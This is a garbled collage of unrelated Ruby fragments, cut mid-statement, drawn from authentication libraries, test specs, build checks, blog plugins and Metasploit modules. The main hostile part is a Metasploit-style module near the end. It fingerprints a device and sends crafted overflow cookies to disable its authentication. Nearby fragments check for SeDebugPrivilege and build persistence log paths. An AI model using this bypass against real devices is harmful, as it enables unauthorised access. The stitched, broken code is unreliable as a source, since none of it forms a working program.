
        
            def aes256_gcm_encrypt(value)
      encrypted_token = Encryptor.encrypt(AES256_GCM_OPTIONS.merge(value: value))
      Base64.strict_encode64(encrypted_token)
    end
    
    describe ProjectMemberPresenter do
  let(:user) { double(:user) }
  let(:project) { double(:project) }
  let(:project_member) { double(:project_member, source: project) }
  let(:presenter) { described_class.new(project_member, current_user: user) }
    
        def chronic_duration_attr_writer(virtual_attribute, source_attribute, parameters = {})
      chronic_duration_attr_reader(virtual_attribute, source_attribute)
    
              # Already exists
          expect(weather_agent_diff.agent).to eq(agents(:bob_weather_agent))
          valid_parsed_weather_agent_data.each do |key, value|
            next if key == :type
            expect(weather_agent_diff.send(key).current).to eq(agents(:bob_weather_agent).send(key))
          end
    
          expect(exporter.as_json[:links]).to eq([{ :source => guid_order(agent_list, :jane_weather_agent), :receiver => guid_order(agent_list, :jane_rain_notifier_agent) }])
    end
    
        it 'work with set FAILED_JOBS_TO_KEEP env variable' do
      expect { @scheduler.send(:cleanup_failed_jobs!) }.to change(Delayed::Job, :count).by(-1)
      expect { @scheduler.send(:cleanup_failed_jobs!) }.to change(Delayed::Job, :count).by(0)
      expect(@keep.id).to eq(Delayed::Job.order(:failed_at)[0].id)
    end
    
      describe '#complete_project_id' do
    it 'should return a array of hashes' do
      expect(@checker.complete_project_id).to eq [{text: 'test (1234)', id: 1234}, {text: 'test1 (1235)', id: 1235}]
    end
  end
    
        # The path used after confirmation.
    def after_confirmation_path_for(resource_name, resource)
      if signed_in?(resource_name)
        signed_in_root_path(resource)
      else
        new_session_path(resource_name)
      end
    end
    
        if resource.errors.empty?
      set_flash_message! :notice, :unlocked
      respond_with_navigational(resource){ redirect_to after_unlock_path_for(resource) }
    else
      respond_with_navigational(resource.errors, status: :unprocessable_entity){ render :new }
    end
  end
    
    # Each time a record is set we check whether its session has already timed out
# or not, based on last request time. If so, the record is logged out and
# redirected to the sign in page. Also, each time the request comes and the
# record is set, we set the last request time inside its scoped session to
# verify timeout in the following request.
Warden::Manager.after_set_user do |record, warden, options|
  scope = options[:scope]
  env   = warden.request.env
    
          def mailer_from(mapping)
        mailer_sender(mapping, :from)
      end
    
        # Creates configuration values for Devise and for the given module.
    #
    #   Devise::Models.config(Devise::Models::DatabaseAuthenticatable, :stretches)
    #
    # The line above creates:
    #
    #   1) An accessor called Devise.stretches, which value is used by default;
    #
    #   2) Some class methods for your model Model.stretches and Model.stretches=
    #      which have higher priority than Devise.stretches;
    #
    #   3) And an instance method stretches.
    #
    # To add the class methods you need to have a module ClassMethods defined
    # inside the given class.
    #
    def self.config(mod, *accessors) #:nodoc:
      class << mod; attr_accessor :available_configs; end
      mod.available_configs = accessors
    
            if Devise.activerecord51?
          def clear_reset_password_token?
            encrypted_password_changed = respond_to?(:will_save_change_to_encrypted_password?) && will_save_change_to_encrypted_password?
            authentication_keys_changed = self.class.authentication_keys.any? do |attribute|
              respond_to?('will_save_change_to_#{attribute}?') && send('will_save_change_to_#{attribute}?')
            end
    
        def check_https_availability
      return unless download
    
                problem 'xcodebuild should be passed an explicit 'SYMROOT''
          end
    
            it 'returns false if all are higher' do
          setup_java_with_version '1.8.0_5'
          expect(subject).not_to be_satisfied
        end
      end
    
        expect do
      described_class.run('local-transmission', 'local-caffeine')
    end.to output('#{transmission_location}\n#{caffeine_location}\n').to_stdout
  end
    
        def quarantine
      return if @quarantine.nil?
      return unless Quarantine.available?
    
          if privs.include?('SeDebugPrivilege')
        print_good('Got SeDebugPrivilege.')
      else
        print_warning('Unable to get SeDebugPrivilege.')
      end
    end
  end
end
    
      def run
    res = send_request_raw(
        'uri' => normalize_uri(target_uri.path.to_s),
        'method' => 'GET',
    )
    model = check_response_fingerprint(res, Exploit::CheckCode::Detected)
    if model != Exploit::CheckCode::Detected
      devices = devices_list[model.to_sym]
      devices = devices_list['ALL'.to_sym] if devices.nil? && datastore['ForceAttempt']
      if devices != nil
        print_good('Detected device:#{devices[:name]} #{devices[:model]}')
        devices[:values].each { |value|
          cookie = 'C#{value[0]}=#{'B'*value[1]}\x00'
          res = send_request_raw(
              'uri' => normalize_uri(target_uri.path.to_s),
              'method' => 'GET',
              'headers' => headers.merge('Cookie' => cookie)
          )
          if res != nil and res.code <= 302
            print_good('Good response, please check host, authentication should be disabled')
            break
          else
            print_error('Bad response')
          end
        }
      else
        print_error('No matching values for fingerprint #{model}')
      end
    else
      print_error('Unknown device')
    end
  end
end

    
    # Pseudo-modules
require 'msf/core/handler'
    
        # Create a directory for the logs
    logs = if log_path
             ::File.join(log_path, 'logs', 'persistence', Rex::FileUtils.clean_path(host + filenameinfo))
           else
             ::File.join(Msf::Config.log_directory, 'persistence', Rex::FileUtils.clean_path(host + filenameinfo))
           end
    
        membership = contact.aspect_memberships.where(aspect_id: aspect.id).first
    
          a = $count
      p.start
      sleep(0.05)
      p.terminate
      p.kill(true)
    
    def config_tag(config, key, tag=nil, classname=nil)
  options     = key.split('.').map { |k| config[k] }.last #reference objects with dot notation
  tag       ||= 'div'
  classname ||= key.sub(/_/, '-').sub(/\./, '-')
  output      = '<#{tag} class='#{classname}''
    
          get_web_content(redirected_url)
    end
    
        def render(context)
      includes_dir = File.join(context.registers[:site].source, '_includes')
    
      # Improved version of Liquid's truncatewords:
  # - Uses typographically correct ellipsis (…) insted of '...'
  def truncatewords(input, length)
    truncate = input.split(' ')
    if truncate.length > length
      truncate[0..length-1].join(' ').strip + ' &hellip;'
    else
      input
    end
  end